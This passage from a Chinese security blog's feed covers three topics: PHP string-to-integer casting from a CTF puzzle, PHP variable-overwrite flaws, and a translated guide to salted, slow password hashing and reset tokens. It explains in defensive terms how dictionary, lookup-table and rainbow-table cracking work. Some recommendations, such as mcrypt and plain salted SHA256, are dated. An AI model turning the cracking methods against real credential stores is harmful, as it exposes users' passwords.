<p>最终的处理逻辑是如果发现了小数点或者数字e，就采用zend_strtod来处理，这样就跟字符串转浮点数是一模一样的处理逻辑了。所以最终的结果也就符合了(int)’6e6’ = (int)(float)’6e6’这个逻辑。</p>
<h2 id="思考">思考</h2><p>那么这到底是个bug还是feature呢。最终的结果来看，php7.0及以前的版本使用strtoll转字符串到整型，7.1以后的版本使用了strtod来转换。所以strtoll不能识别科学计数法表示的数字是不是一个bug。</p>
<h2 id="参考资料">参考资料</h2><p><a href="http://www.freebuf.com/articles/web/165537.html" target="_blank" rel="external">solveme.peng.kr的中文writeup:http://www.freebuf.com/articles/web/165537.html</a><br><a href="https://gywbd.github.io/posts/2016/2/debug-php-source-code.html" target="_blank" rel="external">php源码调试的文章:https://gywbd.github.io/posts/2016/2/debug-php-source-code.html</a><br><a href="https://github.com/pangudashu/php7-internal" target="_blank" rel="external">php7内核分析：https://github.com/pangudashu/php7-internal</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;solveme-peng-kr_winter_sleep&quot;&gt;solveme.peng.kr winter  sleep&lt;/h2&gt;&lt;p&gt;solveme是一个CTF的练习平台，其中winter sleep题目是这样的。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&lt;span cla
    
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>变量覆盖漏洞的思考</title>
    <link href="http://xdxd.love/2018/03/05/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%80%9D%E8%80%83/"/>
    <id>http://xdxd.love/2018/03/05/变量覆盖漏洞的思考/</id>
    <published>2018-03-05T08:50:16.000Z</published>
    <updated>2018-03-05T08:55:38.342Z</updated>
    
    <content type="html"><![CDATA[<h2 id="变量覆盖漏洞原理">变量覆盖漏洞原理</h2><p>变量覆盖漏洞原理比较简单，《代码审计》书中和网上都有了不少分析。主要是以下几个场景：$$使用不当，extract()函数使用不当，parse_str()函数使用不当，import_request_variables()使用不当，开启了全局变量注册等。具体可以参考<a href="http://www.freebuf.com/column/150731.html" target="_blank" rel="external">代码审计|变量覆盖漏洞</a>。</p>
<h2 id="修复方案">修复方案</h2><p>从原理上来讲，只需要注册变量之前判断变量是否存在，如果存在就跳过或者退出变量注册，返回错误信息，就可以避免变量覆盖漏洞。</p>
<h2 id="一些思考">一些思考</h2><p>PHP的全局变量相关的设计增强了编程了的灵活性，但是也引入的不少安全问题。后期也进行了不少改进，注册全局变量功能的移除也证明了自动注册全局变量这个事情是本身是一个不好的设计。</p>
<p>register_globals 从php5.4起移除。</p>
<p><img src="/images/phpbianliang1.png" alt=""></p>
<p>import_request_variables 自php5.4移除</p>
<p><img src="/images/phpbianliang2.png" alt=""></p>
<p>而extract的第二个参数。如果不指定，默认值是EXTR_OVERWRITE。覆盖已经存在的变量。</p>
<p><img src="/images/phpbianliang3.png" alt=""></p>
<p><strong>默认会覆盖变量这个设计，我觉得违背了安全设计原则中的默认安全了。虽然如果默认skip的话可能会导致bug，但是默认覆盖也是会导致更严重的安全bug。所以采用默认加前缀，或者默认跳过都应该是更好的选择。</strong>也许后续的php版本中会有改进。</p>
<h2 id="参考资料">参考资料</h2><p><a href="http://xdxd.love/2015/06/05/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwdcp%E5%A4%9A%E5%A4%84%E6%BC%8F%E6%B4%9E/">代码审计之wdcp多处漏洞</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;变量覆盖漏洞原理&quot;&gt;变量覆盖漏洞原理&lt;/h2&gt;&lt;p&gt;变量覆盖漏洞原理比较简单，《代码审计》书中和网上都有了不少分析。主要是以下几个场景：$$使用不当，extract()函数使用不当，parse_str()函数使用不当，import_request_variable
    
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
  </entry>
  
  <entry>
    <title>如何安全的存储用户的密码</title>
    <link href="http://xdxd.love/2018/02/26/%E5%A6%82%E4%BD%95%E5%AE%89%E5%85%A8%E7%9A%84%E5%AD%98%E5%82%A8%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81/"/>
    <id>http://xdxd.love/2018/02/26/如何安全的存储用户的密码/</id>
    <published>2018-02-26T06:28:59.000Z</published>
    <updated>2018-02-26T06:49:06.865Z</updated>
    
    <content type="html"><![CDATA[<h2 id="更新：">更新：</h2><p>文章是14年翻译的，发在了freebuf和乌云drops上，最近重新看了一下，记录一下思考。总体来说感觉翻译的流畅度还是可以的，那会没有用谷歌翻译，记得翻译了一个星期，很是痛苦。文章比较长，所以顺便写个总结和微博上的一些评论的讨论。</p>
<h2 id="总结：">总结：</h2><p>简单点说存储用户密码的安全最佳实践，使用随机盐拼接密码，用慢速hash函数做hash，基本就可以保证hash数据库泄露，被还原出明文的成本就很高了。如果需要更高的安全等级，可以考虑对hash数据再做一次加密，加密key独立存储。</p>
<p>1，盐的长度要跟hash的长度对应，比如hash之后的结果是32byte，那么盐也要用32byte的随机数。<br>2，慢速hash可能带来一些性能问题，需要参数方便调整。</p>
<h2 id="几个问题">几个问题</h2><p>1，如果数据库泄露，盐也会泄露，那么还是可以暴力破解明文密码。</p>
<p>盐的作用是用来避免彩虹表攻击的。暴力破解和字典攻击是设计上无法避免，永远都会存在的攻击方式。使用恰当的hash函数和盐可以使得暴力破解成本高到无法接受，从而保证安全。</p>
<p>2，关于隐匿安全 obsecurity。</p>
<p>hash密码的方式是没有利用隐匿来保证安全的。这种存储方式的设计是完全可以公开的。目的是保证在算法公开，hash之后的数据公开的情况下，依然可以保护用户明文密码的安全。想到最近 安全圈怪现状的文章中提到的。这应该是一种正向防御的角度，而不是反反向的角度。关于隐匿安全我觉得应该是利用隐匿来实现安全是不可靠的。但是在安全设计之后，利用隐匿来增强安全也是一种防御手段。</p>
<h2 id="原文">原文</h2><p>大多数的web开发者都会遇到设计用户账号系统的需求。账号系统最重要的一个方面就是如何保护用户的密码。一些大公司的用户数据库泄露事件也时有发生，所以我们必须采取一些措施来保护用户的密码，即使网站被攻破的情况下也不会造成较大的危害。如果你还在存储用户密码的MD5,那可真的有点弱了。赶紧来看看这篇文章吧。</p>
<p>保护密码最好的的方式就是使用带盐的密码hash(salted password hashing).对密码进行hash操作是一件很简单的事情，但是很多人都犯了错。接下来我希望可以详细的阐述如何恰当的对密码进行hash，以及为什么要这样做。</p>
<h2 id="重要提醒">重要提醒</h2><p>如果你打算自己写一段代码来进行密码hash，那么赶紧停下吧。这样太容易犯错了。这个提醒适用于每一个人，不要自己写密码的hash算法 ！关于保存密码的问题已经有了成熟的方案，那就是使用phpass或者本文提供的源码。</p>
<h2 id="什么是hash">什么是hash</h2><pre><code>hash("hello") = 2cf24dba5fb<span class="number">0a30e26e83</span>b2ac<span class="number">5b9e29e1</span>b<span class="number">161e5c1</span>fa<span class="number">7425e73043</span><span class="number">362938b98</span>24
hash("hbllo") = <span class="number">58756879c05</span>c68dfac<span class="number">9866712</span>fad<span class="number">6a93f8146</span>f337a69afe7dd<span class="number">238f33649463</span>66
hash("waltz") = c<span class="number">0e81794384</span><span class="number">491161f1777</span>c232bc6bd9ec<span class="number">38f616560</span>b120fda<span class="number">8e90f38385</span>3542
</code></pre><p>Hash算法是一种单向的函数。它可以把任意数量的数据转换成固定长度的“指纹”，这个过程是不可逆的。而且只要输入发生改变，哪怕只有一个bit，输出的hash值也会有很大不同。这种特性恰好合适用来用来保存密码。因为我们希望使用一种不可逆的算法来加密保存的密码，同时又需要在用户登陆的时候验证密码是否正确。</p>
<p>在一个使用hash的账号系统中，用户注册和认证的大致流程如下：</p>
<p>1, 用户创建自己的账号<br>2, 用户密码经过hash操作之后存储在数据库中。没有任何明文的密码存储在服务器的硬盘上。<br>3, 用户登陆的时候，将用户输入的密码进行hash操作后与数据库里保存的密码hash值进行对比。<br>4, 如果hash值完全一样，则认为用户输入的密码是正确的。否则就认为用户输入了无效的密码。<br>5, 每次用户尝试登陆的时候就重复步骤3和步骤4。<br>在步骤4的时候不要告诉用户是账号还是密码错了。只需要显示一个通用的提示，比如账号或密码不正确就可以了。这样可以防止攻击者枚举有效的用户名。</p>
<p>还需要注意的是用来保护密码的hash函数跟数据结构课上见过的hash函数不完全一样。比如实现hash表的hash函数设计的目的是快速，但是不够安全。只有加密hash函数(cryptographic hash functions)可以用来进行密码的hash。这样的函数有SHA256, SHA512, RipeMD, WHIRLPOOL等。</p>
<p>一个常见的观念就是密码经过hash之后存储就安全了。这显然是不正确的。有很多方式可以快速的从hash恢复明文的密码。还记得那些md5破解网站吧，只需要提交一个hash，不到一秒钟就能知道结果。显然，单纯的对密码进行hash还是远远达不到我们的安全需求。下一部分先讨论一下破解密码hash，获取明文常见的手段。</p>
<h2 id="如何破解hash">如何破解hash</h2><p>字典和暴力破解攻击(Dictionary and Brute Force Attacks)<br>最常见的破解hash手段就是猜测密码。然后对每一个可能的密码进行hash，对比需要破解的hash和猜测的密码hash值，如果两个值一样，那么之前猜测的密码就是正确的密码明文。猜测密码攻击常用的方式就是字典攻击和暴力攻击。</p>
<pre><code>Dictionary Attack

Trying <span class="string">apple        :</span> failed
Trying <span class="string">blueberry    :</span> failed
Trying <span class="string">justinbeiber :</span> failed
...
Trying <span class="string">letmein      :</span> failed
Trying <span class="string">s3cr3t       :</span> success!
</code></pre><p>字典攻击是将常用的密码，单词，短语和其他可能用来做密码的字符串放到一个文件中，然后对文件中的每一个词进行hash，将这些hash与需要破解的密码hash比较。这种方式的成功率取决于密码字典的大小以及字典的是否合适。</p>
<pre><code>Brute Force Attack

Trying <span class="string">aaaa :</span> failed
Trying <span class="string">aaab :</span> failed
Trying <span class="string">aaac :</span> failed
...
Trying <span class="string">acdb :</span> failed
Trying <span class="string">acdc :</span> success!
</code></pre><p>暴力攻击就是对于给定的密码长度，尝试每一种可能的字符组合。这种方式需要花费大量的计算机时间。但是理论上只要时间足够，最后密码一定能够破解出来。只是如果密码太长，破解花费的时间就会大到无法承受。</p>
<p>目前没有方式可以阻止字典攻击和暴力攻击。只能想办法让它们变的低效。如果你的密码hash系统设计的是安全的，那么破解hash唯一的方式就是进行字典或者暴力攻击了。</p>
<h2 id="查表破解(Lookup_Tables)">查表破解(Lookup Tables)</h2><p>对于特定的hash类型，如果需要破解大量hash的话，查表是一种非常有效而且快速的方式。它的理念就是预先计算(pre-compute)出密码字典中每一个密码的hash。然后把hash和对应的密码保存在一个表里。一个设计良好的查询表结构，即使存储了数十亿个hash，每秒钟仍然可以查询成百上千个hash。</p>
<p>如果你想感受下查表破解hash的话可以尝试一下在CraskStation上破解下下面的sha256 hash。</p>
<pre><code>c11083b4b0a7743af748c85d343dfee9fbb8b2576c05f3a7f0d632b0926aadfc
<span class="number">08</span>eac03b80adc33dc7d8fbe44b7c7b05d3a2c511166bdb43fcb710b03ba919e7
e4ba5cbd251c98e6cd1c23f126a3b81d8d8328abc95387229850952b3ef9f904
<span class="number">5206</span>b8b8a996cf5320cb12ca91c7b790fba9f030408efe83ebb83548dc3007bd
反向查表破解(<span class="type">Reverse</span> <span class="type">Lookup</span> <span class="type">Tables</span>)
<span class="type">Searching</span> <span class="keyword">for</span> hash(apple) <span class="keyword">in</span> users' hash <span class="built_in">list</span>...     : <span class="type">Matches</span> [alice3, <span class="number">0</span>bob0, charles8]
<span class="type">Searching</span> <span class="keyword">for</span> hash(blueberry) <span class="keyword">in</span> users' hash <span class="built_in">list</span>... : <span class="type">Matches</span> [usr10101, timmy, john91]
<span class="type">Searching</span> <span class="keyword">for</span> hash(letmein) <span class="keyword">in</span> users' hash <span class="built_in">list</span>...   : <span class="type">Matches</span> [wilson10, dragonslayerX, joe1984]
<span class="type">Searching</span> <span class="keyword">for</span> hash(s3cr3t) <span class="keyword">in</span> users' hash <span class="built_in">list</span>...    : <span class="type">Matches</span> [bruce19, knuth1337, john87]
<span class="type">Searching</span> <span class="keyword">for</span> hash(z@<span class="number">29</span>hjja) <span class="keyword">in</span> users' hash <span class="built_in">list</span>...  : <span class="type">No</span> users used this password
</code></pre><p>这种方式可以让攻击者不预先计算一个查询表的情况下同时对大量hash进行字典和暴力破解攻击。</p>
<p>首先，攻击者会根据获取到的数据库数据制作一个用户名和对应的hash表。然后将常见的字典密码进行hash之后，跟这个表的hash进行对比，就可以知道用哪些用户使用了这个密码。这种攻击方式很有效果，因为通常情况下很多用户都会有使用相同的密码。</p>
<h2 id="彩虹表_(Rainbow_Tables)">彩虹表 (Rainbow Tables)</h2><p>彩虹表是一种使用空间换取时间的技术。跟查表破解很相似。只是它牺牲了一些破解时间来达到更小的存储空间的目的。因为彩虹表使用的存储空间更小，所以单位空间就可以存储更多的hash。彩虹表已经能够破解8位长度的任意md5hash。彩虹表具体的原理可以参考<a href="http://www.project-rainbowcrack.com/" target="_blank" rel="external">http://www.project-rainbowcrack.com/</a></p>
<p>下一章节我们会讨论一种叫做“盐”(salting)的技术。通过这种技术可以让查表和彩虹表的方式无法破解hash。</p>
<pre><code>加盐(Adding Salt)
hash("hello")                    = 2cf24dba5fb<span class="number">0a30e26e83</span>b2ac<span class="number">5b9e29e1</span>b<span class="number">161e5c1</span>fa<span class="number">7425e73043</span><span class="number">362938b98</span>24
hash("hello" + "QxLUF1bgIAdeQX") = <span class="number">9e209040c86</span><span class="number">3f84a31e71</span><span class="number">9795b25775</span><span class="number">23954739</span>fe5ed3b58a75cff<span class="number">2127075</span>ed1
hash("hello" + "bv5PehSMfV11Cd") = d1d3ec2e6f20fd<span class="number">420d50e26</span><span class="number">42992841d83</span><span class="number">38a314b8</span>ea<span class="number">157c9e18477</span>aaef226ab
hash("hello" + "YYLmfY6IehjZMQ") = a<span class="number">49670c3c18</span>b<span class="number">9e079b9</span>cfaf<span class="number">51634f563</span>dc8ae3070db<span class="number">2c4a85443</span>05df<span class="number">1b60f007</span>
</code></pre><p>查表和彩虹表的方式之所以有效是因为每一个密码的都是通过同样的方式来进行hash的。如果两个用户使用了同样的密码，那么一定他们的密码hash也一定相同。我们可以通过让每一个hash随机化，同一个密码hash两次，得到的不同的hash来避免这种攻击。</p>
<p>具体的操作就是给密码加一个随即的前缀或者后缀，然后再进行hash。这个随即的后缀或者前缀成为“盐”。正如上面给出的例子一样，通过加盐，相同的密码每次hash都是完全不一样的字符串了。检查用户输入的密码是否正确的时候，我们也还需要这个盐，所以盐一般都是跟hash一起保存在数据库里，或者作为hash字符串的一部分。</p>
<p>盐不需要保密，只要盐是随机的话，查表，彩虹表都会失效。因为攻击者无法事先知道盐是什么，也就没有办法预先计算出查询表和彩虹表。如果每个用户都是使用了不同的盐，那么反向查表攻击也没法成功。</p>
<p>下一节，我们会介绍一些盐的常见的错误实现。</p>
<h2 id="错误的方式：短的盐和盐的复用">错误的方式：短的盐和盐的复用</h2><p>最常见的错误实现就是一个盐在多个hash中使用或者使用的盐很短。</p>
<h2 id="盐的复用(Salt_Reuse)">盐的复用(Salt Reuse)</h2><p>不管是将盐硬编码在程序里还是随机一次生成的，在每一个密码hash里使用相同的盐会使这种防御方法失效。因为相同的密码hash两次得到的结果还是相同的。攻击者就可以使用反向查表的方式进行字典和暴力攻击。只要在对字典中每一个密码进行hash之前加上这个固定的盐就可以了。如果是流行的程序的使用了硬编码的盐，那么也可能出现针对这种程序的这个盐的查询表和彩虹表，从而实现快速破解hash。</p>
<p>用户每次创建或者修改密码一定要使用一个新的随机的盐</p>
<h2 id="短的盐">短的盐</h2><p>如果盐的位数太短的话，攻击者也可以预先制作针对所有可能的盐的查询表。比如，3位ASCII字符的盐，一共有95x95x95 = 857,375种可能性。看起来好像很多。假如每一个盐制作一个1MB的包含常见密码的查询表，857,375个盐才是837GB。现在买个1TB的硬盘都只要几百块而已。</p>
<p>基于同样的理由，千万不要用用户名做为盐。虽然对于每一个用户来说用户名可能是不同的，但是用户名是可预测的，并不是完全随机的。攻击者完全可以用常见的用户名作为盐来制作查询表和彩虹表破解hash。</p>
<p>根据一些经验得出来的规则就是盐的大小要跟hash函数的输出一致。比如，SHA256的输出是256bits(32bytes),盐的长度也应该是32个字节的随机数据。</p>
<h2 id="错误的方式：双重hash和古怪的hash函数">错误的方式：双重hash和古怪的hash函数</h2><p>这一节讨论另外一个常见的hash密码的误解:古怪的hash算法组合。人们可能解决的将不同的hash函数组合在一起用可以让数据更安全。但实际上，这种方式带来的效果很微小。反而可能带来一些互通性的问题，甚至有时候会让hash更加的不安全。本文一开始就提到过，永远不要尝试自己写hash算法，要使用专家们设计的标准算法。有些人会觉得通过使用多个hash函数可以降低计算hash的速度，从而增加破解的难度。通过减慢hash计算速度来防御攻击有更好的方法，这个下文会详细介绍。</p>
<p>下面是一些网上找到的古怪的hash函数组合的样例。</p>
<pre><code>md5<span class="list">(<span class="keyword">sha1</span><span class="list">(<span class="keyword">password</span>)</span>)</span>
md5<span class="list">(<span class="keyword">md5</span><span class="list">(<span class="keyword">salt</span>)</span> + md5<span class="list">(<span class="keyword">password</span>)</span>)</span>
sha1<span class="list">(<span class="keyword">sha1</span><span class="list">(<span class="keyword">password</span>)</span>)</span>
sha1<span class="list">(<span class="keyword">str_rot13</span><span class="list">(<span class="keyword">password</span> + salt)</span>)</span>
md5<span class="list">(<span class="keyword">sha1</span><span class="list">(<span class="keyword">md5</span><span class="list">(<span class="keyword">md5</span><span class="list">(<span class="keyword">password</span>)</span> + sha1<span class="list">(<span class="keyword">password</span>)</span>)</span> + md5<span class="list">(<span class="keyword">password</span>)</span>)</span>)</span>
</code></pre><p>不要使用他们！</p>
<p>注意：这部分的内容其实是存在争议的！我收到过大量邮件说组合hash函数是有意义的。因为如果攻击者不知道我们用了哪个函数，就不可能事先计算出彩虹表，并且组合hash函数需要更多的计算时间。</p>
<p>攻击者如果不知道hash算法的话自然是无法破解hash的。但是考虑到Kerckhoffs’s principle,攻击者通常都是能够接触到源码的(尤其是免费软件和开源软件)。通过一些目标系统的密码–hash对应关系来逆向出算法也不是非常困难。</p>
<p>如果你想使用一个标准的”古怪”的hash函数，比如HMAC，是可以的。但是如果你的目的是想减慢hash的计算速度，那么可以读一下后面讨论的慢速hash函数部分。基于上面讨论的因素，最好的做法是使用标准的经过严格测试的hash算法。</p>
<h2 id="hash碰撞(Hash_Collisions)">hash碰撞(Hash Collisions)</h2><p>因为hash函数是将任意数量的数据映射成一个固定长度的字符串，所以一定存在不同的输入经过hash之后变成相同的字符串的情况。加密hash函数(Cryptographic hash function)在设计的时候希望使这种碰撞攻击实现起来成本难以置信的高。但时不时的就有密码学家发现快速实现hash碰撞的方法。最近的一个例子就是MD5，它的碰撞攻击已经实现了。</p>
<p>碰撞攻击是找到另外一个跟原密码不一样，但是具有相同hash的字符串。但是，即使在相对弱的hash算法，比如MD5,要实现碰撞攻击也需要大量的算力(computing power),所以在实际使用中偶然出现hash碰撞的情况几乎不太可能。一个使用加盐MD5的密码hash在实际使用中跟使用其他算法比如SHA256一样安全。不过如果可以的话，使用更安全的hash函数，比如SHA256, SHA512, RipeMD, WHIRLPOOL等是更好的选择。</p>
<p>正确的方式：如何恰当的进行hash<br>这部分会详细讨论如何恰当的进行密码hash。第一个章节是最基础的，这章节的内容是必须的。后面一个章节是阐述如何继续增强安全性，让hash破解变得异常困难。</p>
<h2 id="基础：使用加盐hash">基础：使用加盐hash</h2><p>我们已经知道恶意黑客可以通过查表和彩虹表的方式快速的获得hash对应的明文密码，我们也知道了通过使用随机的盐可以解决这个问题。但是我们怎么生成盐，怎么在hash的过程中使用盐呢？</p>
<p>盐要使用密码学上可靠安全的伪随机数生成器(Cryptographically Secure Pseudo-Random Number Generator (CSPRNG))来产生。CSPRNG跟普通的伪随机数生成器比如C语言中的rand(),有很大不同。正如它的名字说明的那样，CSPRNG提供一个高标准的随机数，是完全无法预测的。我们不希望我们的盐能够被预测到，所以一定要使用CSPRNG。下表提供了一些常用语言中的CSPRNG。</p>
<pre><code>Platform    CSPRNG
PHP    mcrypt_create_iv, openssl_random_pseudo_bytes
Java    java<span class="class">.security</span><span class="class">.SecureRandom</span>
Dot NET (C#, VB)    System<span class="class">.Security</span><span class="class">.Cryptography</span><span class="class">.RNGCryptoServiceProvider</span>
Ruby    SecureRandom
Python    os<span class="class">.urandom</span>
Perl    Math::Random::Secure
C/C++ (Windows API)    CryptGenRandom
Any language on GNU/Linux or Unix    Read from /dev/random or /dev/urandom
</code></pre><p>每一个用户，每一个密码都要使用不同的盐。用户每次创建账户或者修改密码都要使用一个新的随机盐。永远不要重复使用盐。盐的长度要足够，一个经验规则就是盐的至少要跟hash函数输出的长度一致。盐应该跟hash一起存储在用户信息表里。</p>
<p>存储一个密码：</p>
<p>1, 使用CSPRNG生成一个长的随机盐。 </p>
<p>2, 将密码和盐拼接在一起，使用标准的加密hash函数比如SHA256进行hash </p>
<p>3, 将盐和hash记录在用户数据库中</p>
<p>验证一个密码：</p>
<p>1, 从数据库中取出用户的盐和hash </p>
<p>2, 将用户输入的密码和盐按相同方式拼接在一起，使用相同的hash函数进行hash </p>
<p>3, 比较计算出的hash跟存储的hash是否相同。如果相同则密码正确。反之则密码错误。</p>
<p>在本文的最后，给出了php,C#,Java,Ruby的加盐密码hash的实现代码。</p>
<h2 id="在web应用中，要在服务端进行hash：">在web应用中，要在服务端进行hash：</h2><p>如果你在写一个web应用，可能会有在客户端还是服务端进行hash的疑惑。是将密码在浏览器里使用javascript进行hash，还是将明文传给服务端，在服务端进行hash呢？</p>
<p>即使在客户端用javascript进行了hash，在服务端依然需要将得到的密码hash再进行hash。如果不这么做的话，认证用户的时候，服务端是获取了浏览器传过来的hash跟数据库里的hash比较。这样子看起来是更安全了，因为没有明文密码传送到服务端。但是事实上却不是这样。</p>
<p>问题在于这样的话，如果恶意的黑客获取了用户的hash，就可以直接用来登陆用户的账号了。甚至都不需要知道用户的明文密码！也就不需要破解hash了。</p>
<p>这并不是说你完全不能在浏览器端进行hash。只是如果你要这样做的话，一定要在服务端再hash一次。在浏览器端进行hash是一个不错的想法，但是在实现的时候一定要考虑到以下几点：</p>
<p>1, 客户端密码hash并不是HTTPS(SSL/TLS)的替代品。如果浏览器和服务器之间的连接是不安全的，中间人(man-in-the-middle)可能通过修改网页的加载的javascript移除掉hash函数来得到用户的明文密码。</p>
<p>2, 有些浏览器可能不支持javascript，有些用户也会禁用javascript。为了更好的兼容性，需要检测用户的浏览器是否支持javascript，如果不支持的话就需要在服务端模拟客户端hash的逻辑。</p>
<p>3, 客户端的hash也需要加盐。一个很容想到的方式就是使用客户端脚本请求服务器或得用户的盐。记住，不要使用这种方式。因为这样恶意攻击者就可以通过这个逻辑来判断一个用户名是否有效。因为我们已经在服务端进行了恰当的加盐的hash。所以这里使用用户名跟特定的字符串(比如域名)拼接作为客户端的盐是可以的。</p>
<h2 id="使用慢速hash函数让破解更加困难:">使用慢速hash函数让破解更加困难:</h2><p>加盐可以让攻击者无法使用查表和彩虹表的方式对大量hash进行破解。但是依然无法避免对单个hash的字典和暴力攻击。高端的显卡(GPUs)和一些定制的硬件每秒可以计算数十亿的hash，所以针对单个hash的攻击依然有效。为了避免字典和暴力攻击，我们可以采用一种称为key扩展(key stretching)的技术。</p>
<p>思路就是让hash的过程便得非常缓慢，即使使用高速GPU和特定的硬件，字典和暴力破解的速度也慢到没有实用价值。通过减慢hash的过程来防御攻击，但是hash速度依然可以保证用户使用的时候没有明显的延迟。</p>
<p>key扩展的实现是使用一种大量消耗cpu资源的hash函数。不要去使用自己创造的迭代hash函数，那是不够的。要使用标准算法的hash函数，比如PBKDF2或者bcrypt。PHP实现可以在这里找到。</p>
<p>这些算法采用了一个安全变量或者迭代次数作为参数。这个值决定了hash的过程具体有多慢。对于桌面软件和手机APP，确定这个参数的最好方式是在设备上运行一个标准测试程序得到hash时间大概在半秒左右的值。这样就可以避免暴力攻击，也不会影响用户体验。</p>
<p>如果是在web应用中使用key扩展hash函数，需要考虑可能有大量的计算资源用来处理用户认证请求。攻击者可能通过这种方式来进行拒绝服务攻击。不过我依然推荐使用key扩展hash函数，只是迭代次数设置的小一点。这个次数需要根据自己服务器的计算能力和预计每秒需要处理的认证请求次数来设置。对于拒绝服务攻击可以通过让用户登陆的时候输入验证码的方式来防御。系统设计的时候一定要考虑到这个迭代次数将来可以方便的增加或降低。</p>
<p>如果你担心计算机的能力不够强，而又希望在自己的web应用中使用key扩展hash函数，可以考虑在用户的浏览器运行hash函数。Stanford JavaScript Crypto Library包含了PBKDF2算法。在浏览器中进行hash需要考虑上面提到的几个方面。</p>
<p>理论上不可能破解的hash：使用加密的key和密码hash硬件</p>
<p>只要攻击者能够验证一个猜测的密码是正确还是错误，他们都可以使用字典或者暴力攻击破解hash。更深度的防御方法是加入一个保密的key(secret key)进行hash，这样只有知道这个key的人才能验证密码是否正确。这个可以通过两种方式来实现。一种是hash通过加密算法加密比如AES，或者使用基于key的hash函数(HMAC)。</p>
<p>这个实现起来并不容易。key一定要做到保密，即使系统被攻破也不能泄露才行。但是如果攻击者获取了系统权限，无论key保存在哪里，都可能被获取到。所以这个key一定要保存在一个外部系统中，比如专门用来进行密码验证的物理隔离的服务器。或是使用安装在服务器上特殊硬件，比如YubiHSM。</p>
<p>强烈建议所有大型的服务(超过10万用户)的公司使用这种方式。对于超过100万用户的服务商一定得采用这种方式保护用户信息。</p>
<p>如果条件不允许使用专用验证的服务器和特殊的硬件，依然从这种方式中受益。大部分数据库泄露都是利用了SQL注入技术。sql注入大部分情况下，攻击者都没法读取服务器上的任意文件(关闭数据库服务器的文件权限)。如果你生成了一个随机的key，把它保存在了一个文件里。并且密码使用了加密key的加盐hash，单单sql注入攻击导致的hash泄露并不会影响用户的密码。虽然这种方式不如使用独立的系统来保存key安全，因为如果系统存在文件包含漏洞的话，攻击者就可能读取这个秘密文件了。不过，使用了加密key总归好过没有使用吧。</p>
<p>需要注意使用key的hash并不是不需要加盐，聪明的攻击者总是会找到办法获取到key的。所以让hash在盐和key扩展的保护下非常重要。</p>
<h2 id="其他的安全措施">其他的安全措施</h2><p>密码hash仅仅是在发生安全事故的时候保护密码。它并不能让应用程序更加安全。对于保护用户密码hash更多的是需要保护密码hash不被偷走。</p>
<p>即使经验丰富的程序也需要经过安全培训才能写出安全的应用。一个不错的学习web应用漏洞的资源是OWASP。除非你理解了OWASP Top Ten Vulnerability List,否则不要去写关系到敏感数据的程序。公司有责任确保所有的开发者都经过了足够的安全开发的培训。</p>
<p>通过第三方的渗透测试也是不错的方式。即使最好的程序员也会犯错，所以让安全专家来审计代码总是有意义的。寻找一个可信赖的第三方或者自己招聘一个安全人员来机型定期的代码审计。安全评审要在应用生命周期的早期就开始并且贯穿整个开发过程。</p>
<p>对网站进行入侵监控也十分重要。我建议至少招聘一名全职的安全人员进行入侵检测和安全事件响应。如果入侵没有检测到，攻击者可能让在你的网站上挂马影响你的用户。所以迅速的入侵检测和响应也很重要。</p>
<h2 id="经常提问的问题">经常提问的问题</h2><p>我应该使用什么hash算法</p>
<p>可以使用</p>
<p>1, 本文最后介绍的代码 </p>
<p>2, OpenWall的Portable PHP password hashing framework </p>
<p>3, 经过充分测试的加密hash函数，比如SHA256, SHA512, RipeMD, WHIRLPOOL, SHA3等 </p>
<p>4, 设计良好的key扩展hash算法，比如PBKDF2，bcrypt，scrypt </p>
<p>5, crypt#Library_Function_crypt.283.29)的安全版本。($2y$, $5$, $6$)</p>
<p>不要使用</p>
<p>1, 过时的hash函数，比如MD5,SHA1 </p>
<p>2， crypt的不安全版本。($1$, $2$, $2x$, $3$) </p>
<p>3, 任何自己设计的算法。</p>
<p>尽管MD5和SHA1并没有密码学方面的攻击导致它们生成的hash很容易被破解，但是它们年代很古老了，通常都认为(可能有一些不恰当)它们不合适用来进行密码的存储。所以我不推荐使用它们。对于这个规则有个例外就是PBKDF2,它使用SHA1作为它的基础算法。</p>
<p>当用户忘记密码的时候我应该怎样让他们重置</p>
<p>在我个人看来现在外面广泛使用的密码重置机制都是不安全的，如果你有很高的安全需求，比如重要的加密服务，那么不要让用户重置他们的密码。</p>
<p>大多数网站使用绑定的email来进行密码找回。通过生成一个随机的只使用一次的token，这个token必须跟账户绑定，然后把密码重置的链接发送到用户邮箱中。当用户点击密码重置链接的时候，提示他们输入新的密码。需要注意token一定要绑定到用户以免攻击者使用发送给自己的token来修改别人的密码。</p>
<p>token一定要设置成15分钟后或者使用一次后作废。当用户登陆或者请求了一个新的token的时候，之前发送的token都作废也是不错的主意。如果token不失效的话，那么就可以用来永久控制这个账户了。Email(SMTP)是明文传输的协议，而互联网上可能有很多恶意的路由器记录email流量。并且用户的email账号也可能被盗。使token尽可能快的失效可以降低上面提到的这些风险。</p>
<p>用户可能尝试去修改token，所以不要在token里存储任何账户信息。token应该是一个不能被预测的随机的二进制块(binary blob)，仅仅用来进行识别的一条记录。</p>
<p>永远不要通过email发送用户的新密码。记得用户重置密码的时候要重新生成盐，不要使用之前旧密码使用的盐。</p>
<p>如果我的用户数据库泄露了，我应该怎么办</p>
<p>第一要做的就是弄明白信息是怎么泄露的，然后把漏洞修补好。</p>
<p>人们可能会想办法掩盖这次安全事件，希望没有人知道。但是，尝试掩盖安全事件会让你的处境变得更糟。因为你不告知你的用户他的信息和密码可能泄露了会给用户带来更大的风险。一定要第一时间通知用户发生了安全事件，即使你还没有完全搞明白黑客到底渗透到了什么程度。在首页上放一个提醒，然后链接到详细说明的页面。如果可能的话给每一个用户发送email提醒。</p>
